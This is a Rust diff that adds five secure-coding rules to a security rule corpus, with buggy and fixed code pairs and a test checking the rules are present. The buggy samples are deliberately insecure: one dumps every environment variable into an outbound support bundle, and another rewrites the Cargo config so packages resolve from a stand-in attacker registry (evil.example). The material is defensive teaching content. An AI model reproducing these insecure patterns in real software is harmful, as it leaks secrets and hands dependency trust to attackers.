@@ -3989,6 +3989,212 @@ standalone-compiled AND executed)."
             family: SecFamily::InputValidation,
         },
 
+        // ══ Batch 423 (Plan 417 tranche B / Research 451, the             ══
+        // ══ security-tools sweep's contestables): FOUR suggest-only       ══
+        // ══ InputValidation rules survive the pre-named drop paths; the   ══
+        // ══ drops recorded in the plan. Fixtures in                       ══
+        // ══ fixtures/b423_sec_fixtures.rs, standalone-compiled AND        ══
+        // ══ executed (debug AND -O) BEFORE entry. AGPL/LGPL sources are   ══
+        // ══ transcription-only: the DECISION synthesized, never the code. ══
+
+        // ── wholesale-env-harvest-to-egress (InputValidation; suggest-only) ──
+        SecRule {
+            rule_id: "wholesale-env-harvest-to-egress".to_string(),
+            sec_concept: "a request payload built by ENUMERATING the whole environment — env::vars()/\
+vars_os() walked into one outbound serialization — ships every secret the process holds \
+(AWS keys, tokens, DB passwords) to whatever destination the request names, whether or not \
+any single var was wanted. THE SEVERITY SPLIT IS THE SOURCE'S OWN LAW, verbatim at the pin \
+(NVIDIA/SkillSpector @ 02894ec5, README E2 table, Apache-2.0): 'Enumerating, copying, or \
+searching environment data to collect secrets. A copy traced only to a child process's \
+`env=` is reported LOW' — the child-env HANDOFF carve-out (a spawned child's private \
+environment is normal plumbing, its payload stays process-private) is decision content; the \
+class is ENUMERATION payload-mass, never a named lookup. ⛔ KINSHIPS, both directions: \
+`credential-material-in-command-argv` (B342 — owns ONE credential on a COMMAND line, the \
+transport/EXPOSURE axis; THIS owns the enumerated PAYLOAD-MASS axis — the difference is \
+walk-all vs fetch-one, and one secret by name is never this class); \
+`unvalidated-egress-url` (B342 — owns the URL-CHOICE axis; THIS composes: the harvest fills \
+the body, the egress rule governs where it goes); `quantum-vulnerable-primitive-selection` \
+(CryptoHygiene, distinct); the harvest-now-decrypt-later prose (CryptoHygiene) is the \
+retention threat, not this collection surface. REGIME: any handler serializing process state \
+for outbound transport (telemetry, crash reports, 'debug snapshots', support bundles) — the \
+convenient helpers make the harvest one line. ANTI-REGIME: named lookups (`std::env::var(\"K\")`) \
+—even for secrets (the argv rule's class); child-process env handoffs (the LOW carve); \
+allowlisted enumerations that genuinely ship only configuration (a filter naming ONE safe var \
+while the rest ride the payload is the tamper arm — the fig-leaf harvest). Rust shape: \
+`env::vars()`/`vars_os()` iterated into a request body — the detector keys the \
+enum-into-serialize flow (none at landing: the payload-assembly co-residence a parse-only \
+pass cannot bind). Suggest-only: WHICH vars may ship is the harness's design. Fixture: \
+`fixtures/b423_sec_fixtures.rs` F1 (the enumeration arm; the named-lookup arm; the child-env \
+carve arm; the allowlist-fig-leaf tamper arm). Batch 423 / Plan 417 tranche B / Research 451 \
+(NVIDIA/SkillSpector @ 02894ec5, Apache-2.0 — the E2 row quoted byte-exact at the pin; the \
+fixture is an original synthesis, standalone-compiled AND executed)."
+                .to_string(),
+            buggy_code: "/// NAIVE: the support bundle walks the whole environment into the \n/// outbound report — every secret the process holds rides along.\npub fn build_support_bundle() -> String {\n    let env_dump: Vec<String> = std::env::vars()\n        .map(|(k, v)| format!(\"{k}={v}\"))\n        .collect();\n    format!(\"support bundle: diagnostics + {}\", env_dump.join(\";\"))\n}\n".to_string(),
+            fixed_code: "/// FIXED: an explicit allowlist of configuration keys; secrets are \n/// never enumerated — one var at a time, by name, at the use site.\npub fn build_support_bundle() -> String {\n    const SAFE_KEYS: [&str; 3] = [\"RUST_LOG\", \"CI\", \"TERM\"];\n    let env_dump: Vec<String> = SAFE_KEYS\n        .iter()\n        .filter_map(|k| std::env::var(k).ok().map(|v| format!(\"{k}={v}\")))\n        .collect();\n    format!(\"support bundle: diagnostics + {}\", env_dump.join(\";\"))\n}\n".to_string(),
+            family: SecFamily::InputValidation,
+        },
+
+        // ── predictable-temp-dir-security-operation (InputValidation; suggest-only) ──
+        SecRule {
+            rule_id: "predictable-temp-dir-security-operation".to_string(),
+            sec_concept: "a security-relevant artifact (token cache, key material, credential file, \
+lock over a privileged operation) written into a SHARED temp directory under a FIXED or \
+predictable name can be pre-created, symlinked, or raced by any local user between the check \
+and the use — the std temp_dir doc's own law, quoted in the source rule verbatim (semgrep \
+rust/lang/security/temp-dir.yml @ a5ad1714, LGPL-2.1 + Semgrep Rules License — \
+transcription-only): 'The temporary directory may be shared among users, or between processes \
+with different privileges; thus, the creation of any files or directories in the temporary \
+directory must use a secure method to create a uniquely named file.' THE FIX IS THE PAIR: a \
+unique name (pid + entropy salt — uniqueness the attacker cannot predict) AND `create_new` \
+(O_EXCL — creation REFUSES an existing path, so a planted file is never adopted); either \
+half alone loses (unique-but-created-plain still truncates a raced path; exclusive-but-\
+predictable still refuses everything after the first run's orphan). ⛔ KINSHIPS: \
+`secret-file-create-without-0600` owns the PERMISSIONS axis (0600 on the created file; THIS \
+owns the NAME-PREDICTABILITY + EXCLUSIVITY axis — compose: a secure artifact needs both); \
+`shared_temp_path_gate`/`shared_temp_path_fix` are this workspace's own TEST-side gates (the \
+same class from a THIRD independent source — semgrep ships it as a community Rust rule — \
+corroboration, cited never landed); `predictable-rng-for-secret-material` (CryptoHygiene) \
+owns the SECRET-VALUE axis (guessable contents; THIS owns the guessable PATH). REGIME: \
+multi-user shared /tmp; ANTI-REGIME: per-user temp roots the attacker cannot write (TMPDIR \
+owned by the user); non-security artifacts where a collision is a nuisance, not a takeover. \
+Rust shape: `create_new` on a pid/entropy-salted name — never `File::create` on a fixed \
+path, never check-then-create (the window IS the bug — the tamper arm). Suggest-only: the \
+salt source and the naming scheme are the harness's design. Detector: none at landing (the \
+security-relevance of the artifact's CONTENT a parse-only pass cannot classify — every \
+temp write is a candidate). Fixture: `fixtures/b423_sec_fixtures.rs` F2 (the attacker-\
+pre-creates arm; the unique-exclusive arm — distinct salts never collide, the planted path \
+refuses; the per-user anti-regime arm; the check-then-create tamper arm). Batch 423 / Plan \
+417 tranche B / Research 451 (semgrep-rules @ a5ad1714, the temp-dir.yml rule message \
+quoted; the fixture is an original synthesis, standalone-compiled AND executed)."
+                .to_string(),
+            buggy_code: "/// NAIVE: the token cache lands in the shared temp dir under a \n/// fixed name — any local user pre-creates or races it.\npub fn write_token_cache(token: &str) -> std::io::Result<()> {\n    let path = std::env::temp_dir().join(\"token_cache.tmp\");\n    std::fs::write(path, token)\n}\n".to_string(),
+            fixed_code: "/// FIXED: unique name (pid + entropy salt) + create_new — the \n/// attacker cannot predict the path, and a planted path REFUSES rather \n/// than being adopted.\npub fn write_token_cache(token: &str, salt: u64) -> std::io::Result<std::path::PathBuf> {\n    let name = format!(\"token_cache_{}_{}.tmp\", std::process::id(), salt);\n    let path = std::env::temp_dir().join(name);\n    // create_new = O_EXCL: the atomic check+create, no TOCTOU window\n    let mut f = std::fs::OpenOptions::new().write(true).create_new(true).open(&path)?;\n    use std::io::Write;\n    f.write_all(token.as_bytes())?;\n    Ok(path)\n}\n".to_string(),
+            family: SecFamily::InputValidation,
+        },
+
+        // ── ambiguous-outcome-staging-retention (InputValidation; suggest-only) ──
+        SecRule {
+            rule_id: "ambiguous-outcome-staging-retention".to_string(),
+            sec_concept: "a staged remote artifact (uploaded bundle, queued request, pending write) whose \
+consuming operation launched AMBIGUOUSLY — network error, 5xx, malformed success response, \
+interruption — must be RETAINED with a typed unknown outcome and a reconcile path, never \
+deleted on a maybe and never retried blind: the source's law, verbatim at the pin \
+(usestrix/strix @ 9ed84f99, AGENTS.md + source_scan.py handle_response_failure, Apache-2.0): \
+'A staged upload is deleted after a definitive rejection, but retained when a network error, \
+`5xx`, malformed success response, or interruption leaves the scan launch ambiguous… JSON \
+reports its `upload_id` with `launch_outcome_unknown: true`, or with `cleanup_unknown: true` \
+when automatic deletion cannot be confirmed. Check `scans list` before retrying; if no scan \
+is linked, run `uploads delete UPLOAD_ID`.' THREE clauses: cleanup only on DEFINITIVE \
+outcomes; ambiguity RETAINS + names the artifact (`upload_retained` + `cleanup_unknown` in \
+the payload, :314-316); the reconcile path is the retry's prerequisite (blind retry after an \
+ambiguous launch duplicates the staged artifact — the tamper arm; the idempotency key is the \
+source's own answer, `_attach_idempotency_recovery`). ⛔ KINSHIPS: kin \
+`agent-child-unsandboxed-account-authority` (B393) — its REMOTE-STATUS-STANDIN face owns the \
+EXEC-sink cousin (a stub that reads as success must be killed; the don't-let-ambiguity-read-\
+as-a-verdict genus); THIS owns the CLEANUP/STAGING side (what happens to the staged artifact \
+when the outcome is unknown — adjudicate in-rule, the faces compose); distinct-from \
+`capacity-exceeded-silent-fallback-not-refusal` (B330 — the silent substitution axis; THIS \
+RETAINS and names, the opposite of silent); kin `probe-unknown-tri-state` (Batch 422 — the \
+tri-state OUTCOME vocabulary is the same honest-unknown contract at the probe seam, \
+compose); distinct-from `consent-digest-bound-approval` (Batch 422 — the approval binding vs \
+the retention binding, both name their artifact). REGIME: any multi-step remote flow with a \
+staged artifact between steps (upload→launch, stage→commit, queue→execute). ANTI-REGIME: \
+single-shot operations with nothing staged; flows where the artifact is free to recreate \
+(no cost, no orphan risk). Rust shape: `handle_launch(outcome)` — DefinitiveRejection \
+deletes, Ambiguous retains + returns the reconcile note; the retry path MUST reconcile \
+first. Suggest-only: the reconcile vocabulary is the harness's design. Detector: none at \
+landing (the staged-artifact lifetime across calls a parse-only pass cannot bind). Fixture: \
+`fixtures/b423_sec_fixtures.rs` F3 (the definitive arm; the ambiguous-retained arm naming \
+the id; the blind-retry tamper arm — the duplicate; the idempotent-reconcile arm). Batch \
+423 / Plan 417 tranche B / Research 451 (strix @ 9ed84f99, Apache-2.0 — AGENTS.md + \
+source_scan.py:102-125 quoted at the pin; the fixture is an original synthesis, \
+standalone-compiled AND executed)."
+                .to_string(),
+            buggy_code: "/// NAIVE: every failure path deletes the staged upload — a 5xx \n/// (ambiguous: did the launch happen?) deletes it too, and a blind \n/// retry orphans the first artifact.\npub async fn launch(upload_id: &str) -> Result<(), String> {\n    match try_launch(upload_id).await {\n        Ok(()) => Ok(()),\n        Err(e) => {\n            delete_upload(upload_id).await; // WRONG: the launch may have SUCCEEDED server-side\n            Err(e.to_string())\n        }\n    }\n}\n".to_string(),
+            fixed_code: "/// FIXED: definitive rejection deletes; ambiguity RETAINS the \n/// staged upload, names it in the typed payload, and the retry \n/// reconciles BEFORE re-launching.\npub async fn launch(upload_id: &str) -> Result<LaunchOutcome, String> {\n    match try_launch(upload_id).await {\n        Ok(()) => Ok(LaunchOutcome::DefinitiveAccept),\n        Err(e) if e.is_definitive_rejection() => {\n            delete_upload(upload_id).await;\n            Ok(LaunchOutcome::DefinitiveRejection)\n        }\n        Err(e) => {\n            // ambiguous: network error / 5xx / malformed success / interrupt —\n            // RETAIN + name + reconcile (never delete on a maybe)\n            Err(format!(\n                \"{e}; upload {upload_id} retained (launch_outcome_unknown) — reconcile with uploads delete {upload_id} before retrying\"\n            ))\n        }\n    }\n}\n\npub enum LaunchOutcome { DefinitiveAccept, DefinitiveRejection }\n".to_string(),
+            family: SecFamily::InputValidation,
+        },
+
+        // ── auth-header-not-marked-sensitive (InputValidation; suggest-only) ──
+        SecRule {
+            rule_id: "auth-header-not-marked-sensitive".to_string(),
+            sec_concept: "an Authorization/credential header value built into an HTTP client's header \
+map without `set_sensitive(true)` before insertion rides every debug/trace/log form of that \
+map verbatim — the credential leaks to any log line, error dump, or span record that renders \
+the headers. The source rule (semgrep rust reqwest-set-sensitive.yml @ a5ad1714, LGPL-2.1 + \
+Semgrep Rules License — transcription-only) pins the reqwest shape: HeaderValue::from_static \
+into HeaderMap::insert WITHOUT the set_sensitive call — the flag exists precisely so the \
+client's Debug/Trace impls redact the value. THE ORDERING IS THE TAMPER ARM: marking AFTER \
+insert covers nothing (the map stores its own copy taken at insert; the caller's late flag \
+never reaches it) — set_sensitive must precede the insert on THE value that is inserted. ⛔ \
+KINSHIPS: distinct-from `credential-material-in-command-argv` (B342 — credentials on a \
+COMMAND line's argv, the process-listing exposure axis; THIS is the log-rendering exposure \
+axis of an HTTP header); kin `secret-key-without-zeroize` (B327 — the memory-hygiene axis, \
+compose: sensitive + zeroized covers log AND swap); kin `redaction-audit-hit-carries-raw-match` \
+(B330 — the audit-emission face of the same leak genus, different surface). REGIME: any \
+HTTP client assembling credential headers (Authorization, Proxy-Authorization, cookie \
+values, API-key headers). ANTI-REGIME: non-credential headers (marking everything defeats \
+the signal); clients whose header maps have no log rendering (still cheap to mark). Rust \
+shape: `let mut v = HeaderValue::from_static(...); v.set_sensitive(); map.insert(name, v)` \
+— the flag before the clone. Suggest-only: which headers are credential-bearing is the \
+harness's design. Detector: none at landing (the set-sensitive-after-insert ordering needs \
+the insert-site pairing a parse-only pass cannot bind). Fixture: `fixtures/b423_sec_fixtures.rs` \
+F4 (the leak arm — the value rides the log form; the marked arm — redacted; the late-marking \
+tamper arm — the stored clone unaffected; the clean arm). Batch 423 / Plan 417 tranche B / \
+Research 451 (semgrep-rules @ a5ad1714, the reqwest-set-sensitive.yml pattern pair quoted; \
+the fixture is an original synthesis, standalone-compiled AND executed)."
+                .to_string(),
+            buggy_code: "/// NAIVE: the credential header built and inserted without the \n/// sensitive flag — every log form of the map carries it verbatim.\npub fn authed_client(token: &str) -> HeaderMap {\n    let mut headers = HeaderMap::new();\n    let value = HeaderValue::from_static(&format!(\"Bearer {token}\"));\n    headers.insert(\"authorization\", value);\n    headers\n}\n\npub struct HeaderMap { entries: Vec<(String, String)> }\nimpl HeaderMap { pub fn new() -> Self { Self { entries: vec![] } }\n    pub fn insert(&mut self, name: &str, value: String) {\n        self.entries.push((name.to_string(), value));\n    }\n}\npub struct HeaderValue(String);\nimpl HeaderValue {\n    pub fn from_static(s: &str) -> Self { Self(s.to_string()) }\n}\n".to_string(),
+            fixed_code: "/// FIXED: set_sensitive BEFORE insert — the map's stored copy \n/// carries the flag, and every log form redacts the value.\npub fn authed_client(token: &str) -> HeaderMap {\n    let mut headers = HeaderMap::new();\n    let mut value = HeaderValue::from_sensitive(format!(\"Bearer {token}\"));\n    value.set_sensitive(); // BEFORE insert: the flag rides the clone\n    headers.insert(\"authorization\", value);\n    headers\n}\n\npub struct HeaderMap { entries: Vec<(String, HeaderValue)> }\nimpl HeaderMap { pub fn new() -> Self { Self { entries: vec![] } }\n    pub fn insert(&mut self, name: &str, value: HeaderValue) {\n        self.entries.push((name.to_string(), value));\n    }\n    /// log/debug forms redact sensitive values\n    pub fn log_form(&self) -> String {\n        self.entries.iter()\n            .map(|(n, v)| if v.sensitive { format!(\"{n}: [SENSITIVE]\") } else { format!(\"{n}: {}\", v.inner) })\n            .collect::<Vec<_>>().join(\", \")\n    }\n}\npub struct HeaderValue { inner: String, sensitive: bool }\nimpl HeaderValue {\n    pub fn from_sensitive(s: String) -> Self { Self { inner: s, sensitive: false } }\n    pub fn set_sensitive(&mut self) { self.sensitive = true; }\n}\n".to_string(),
+            family: SecFamily::InputValidation,
+        },
+
+        // ── package-source-redirection (InputValidation; suggest-only) ──
+        SecRule {
+            rule_id: "package-source-redirection".to_string(),
+            sec_concept: "skill/shell content that ADDS or REPLACES a package-manager source (npm \
+`.npmrc` registry, pip `PIP_INDEX_URL`/`pip config set`, Cargo `.cargo/config.toml` source/\
+registry rows, Yarn/Poetry/Maven equivalents) moves the dependency trust boundary to a \
+destination the reviewer never audited — every subsequent install resolves through it. THE \
+SOURCE'S TRUST MODEL, verbatim at the pin (NVIDIA/SkillSpector @ 02894ec5, \
+docs/DEPENDENCY_SOURCE_REDIRECTION.md, Apache-2.0): 'SkillSpector reports deterministic HIGH \
+SC10 findings when skill content adds or replaces a package-manager source' + 'Canonical \
+public defaults are built into the analyzer solely to avoid reporting an unchanged default as \
+a redirection. Every other resolved destination is reported uniformly' + 'Dynamic \
+destinations are reported as `unresolved` rather than ignored.' THE LOAD-BEARING ANTI-REGIME \
+(house-carved, the plan's own precondition): a COMMITTED `[patch.crates-io]`/`[patch]` row \
+backed by a LOCAL `vendor/` tree is THIS workspace's by-design vendoring posture — the carve \
+is the PAIR (patch line + local tree present); a patch without the local tree, or any row \
+added toward a foreign registry/git host, is the finding. ⛔ KINSHIPS: distinct-from \
+`untrusted-download-verify-then-atomic-install` (B345 — the artifact-integrity axis for one \
+download; THIS owns the SOURCE-mapping axis for ALL future downloads — the boundary move, \
+not the artifact); distinct-from `external-helper-config-pinned-invocation` (B373 — the \
+spawn-side env pinning; THIS is the persisted config surface); kin `untrusted-content-\
+interpolated-into-prompt` (B350 — injected content changing what the system trusts, at the \
+package seam); kin `scm-unpinned-dependency` classes (the version-pinning axis; THIS is the \
+WHERE-from axis, orthogonal to the WHICH-version axis). REGIME: skill bundles, setup \
+scripts, CI jobs, agent-authored shell fences — any surface that can write a package-manager \
+config row or export the env override. ANTI-REGIME: reading package catalogs (no row \
+written); the vendored pair (the carve); canonical defaults (unchanged). Rust shape: \
+classify(row, destination, committed_patch, local_vendor_tree) — Unchanged / VendoredByDesign \
+/ Redirected / UnresolvedDestination (dynamic destinations REPORTED unresolved, never \
+ignored, never accepted on faith). Suggest-only: the canonical-default table is the \
+reviewer's policy. Detector: none at landing (the config-file + destination co-residence \
+spans the manifest surface a parse-only pass cannot bind). Fixture: \
+`fixtures/b423_sec_fixtures.rs` F5 (the redirection arm; the vendored-pair carve arm; the \
+patch-without-tree arm — the carve is the pair; the unchanged-default arm; the unresolved-\
+destination arm). Batch 423 / Plan 417 tranche B / Research 451 (SkillSpector @ 02894ec5, \
+Apache-2.0 — the trust-model lines quoted byte-exact at the pin; the fixture is an original \
+synthesis, standalone-compiled AND executed)."
+                .to_string(),
+            buggy_code: "/// NAIVE: the skill's setup script repoints the package registry — \n/// every later install resolves through the attacker's index.\npub fn setup_skill_environment() {\n    let config = \"[source.crates-io]\\nreplace-with = 'mirror'\\n\\n[source.mirror]\\nregistry = \\\"https://evil.example/index\\\"\\n\";\n    std::fs::write(std::path::Path::new(\".cargo\").join(\"config.toml\"), config);\n}\n".to_string(),
+            fixed_code: "/// FIXED: the trust-boundary change is a typed decision — canonical \
+/// defaults pass, the committed-vendored PAIR passes (this house's \
+/// by-design posture), a dynamic destination reports UNRESOLVED (never \
+/// ignored), and everything else is the named finding.\npub enum SourceVerdict { Unchanged, VendoredByDesign, Redirected, UnresolvedDestination }\n\npub fn classify_source_row(\n    destination: Option<&str>,\n    committed_patch: bool,\n    local_vendor_tree: bool,\n) -> SourceVerdict {\n    const CANONICAL: [&str; 2] = [\n        \"crates.io\",\n        \"registry+https://github.com/rust-lang/crates.io-index\",\n    ];\n    let Some(dest) = destination else { return SourceVerdict::Unchanged };\n    if CANONICAL.iter().any(|c| dest.contains(c)) {\n        return SourceVerdict::Unchanged;\n    }\n    if committed_patch && local_vendor_tree {\n        return SourceVerdict::VendoredByDesign;\n    }\n    if dest.starts_with(\"dynamic:\") {\n        return SourceVerdict::UnresolvedDestination; // reported, never ignored\n    }\n    SourceVerdict::Redirected\n}\n".to_string(),
+            family: SecFamily::InputValidation,
+        },
+
     ]
 }
 
@@ -4400,8 +4606,8 @@ mod tests {
         ];
         assert_eq!(
             all.len(),
-            99,
-            "the sec corpus count: 94 + 5 batch-422 rules"
+            104,
+            "the sec corpus count: 99 + 5 batch-423 rules"
         );
         for (id, family) in ids {
             let r = all
@@ -5990,4 +6196,134 @@ fn batch402_deny_list_rule_present_and_pinned() {
         syn::parse_file(&r.buggy_code).is_ok() && syn::parse_file(&r.fixed_code).is_ok(),
         "batch-402 buggy/fixed must both parse"
     );
+}
+
+/// Batch 423 — the security-tools sweep's tranche-B contestables (Plan 417 /
+/// Research 451): present, parsed, decision content pinned.
+#[test]
+fn batch423_rules_present_families_and_provenance() {
+    let all = entries();
+    let ids = [
+        (
+            "wholesale-env-harvest-to-egress",
+            SecFamily::InputValidation,
+        ),
+        (
+            "predictable-temp-dir-security-operation",
+            SecFamily::InputValidation,
+        ),
+        (
+            "ambiguous-outcome-staging-retention",
+            SecFamily::InputValidation,
+        ),
+        (
+            "auth-header-not-marked-sensitive",
+            SecFamily::InputValidation,
+        ),
+        ("package-source-redirection", SecFamily::InputValidation),
+    ];
+    for (id, family) in ids {
+        let r = all
+            .iter()
+            .find(|r| r.rule_id == id)
+            .unwrap_or_else(|| panic!("batch-423 rule '{id}' missing from corpus"));
+        assert_eq!(r.family, family, "batch-423 {id} family");
+        assert!(
+            r.sec_concept
+                .contains("Batch 423 / Plan 417 tranche B / Research 451"),
+            "batch-423 {id} must cite its landing lineage"
+        );
+        assert!(
+            r.sec_concept.contains("standalone-compiled AND executed"),
+            "batch-423 {id} must carry the fixture-preflight provenance"
+        );
+        assert!(
+            r.sec_concept.contains("Suggest-only"),
+            "batch-423 {id} must be suggest-only"
+        );
+        assert!(
+            !crate::domains::sec::proposers::FIXABLE_SEC.contains(&r.rule_id.as_str()),
+            "batch-423 must stay suggest-only (never FIXABLE_SEC)"
+        );
+        // both halves parse
+        assert!(
+            syn::parse_file(&r.buggy_code).is_ok() && syn::parse_file(&r.fixed_code).is_ok(),
+            "batch-423 {id} buggy/fixed must both parse"
+        );
+    }
+    // the harvest rule's carve law + the walk-all-vs-fetch-one adjudication
+    let b3 = all
+        .iter()
+        .find(|r| r.rule_id == "wholesale-env-harvest-to-egress")
+        .unwrap();
+    for needle in [
+        "child process's `env=` is reported LOW",
+        "credential-material-in-command-argv",
+        "unvalidated-egress-url",
+    ] {
+        assert!(
+            b3.sec_concept.contains(needle),
+            "B3 needle {needle:?} missing"
+        );
+    }
+    // the temp-dir rule's PAIR law + the third-source corroboration
+    let b5 = all
+        .iter()
+        .find(|r| r.rule_id == "predictable-temp-dir-security-operation")
+        .unwrap();
+    for needle in [
+        "must use a secure method to create a uniquely named file",
+        "either half alone loses",
+        "shared_temp_path_gate",
+    ] {
+        assert!(
+            b5.sec_concept.contains(needle),
+            "B5 needle {needle:?} missing"
+        );
+    }
+    // the staging rule's three clauses + the exec-sink cousin
+    let b8 = all
+        .iter()
+        .find(|r| r.rule_id == "ambiguous-outcome-staging-retention")
+        .unwrap();
+    for needle in [
+        "A staged upload is deleted after a definitive rejection",
+        "REMOTE-STATUS-STANDIN",
+        "probe-unknown-tri-state",
+    ] {
+        assert!(
+            b8.sec_concept.contains(needle),
+            "B8 needle {needle:?} missing"
+        );
+    }
+    // the header rule's ordering law + the adjudications
+    let b6 = all
+        .iter()
+        .find(|r| r.rule_id == "auth-header-not-marked-sensitive")
+        .unwrap();
+    for needle in [
+        "must precede the insert",
+        "credential-material-in-command-argv",
+        "secret-key-without-zeroize",
+    ] {
+        assert!(
+            b6.sec_concept.contains(needle),
+            "B6 needle {needle:?} missing"
+        );
+    }
+    // the source rule's anti-regime (the vendored PAIR) + the trust model
+    let b4 = all
+        .iter()
+        .find(|r| r.rule_id == "package-source-redirection")
+        .unwrap();
+    for needle in [
+        "unresolved` rather than ignored",
+        "the carve is the PAIR",
+        "untrusted-download-verify-then-atomic-install",
+    ] {
+        assert!(
+            b4.sec_concept.contains(needle),
+            "B4 needle {needle:?} missing"
+        );
+    }
 }
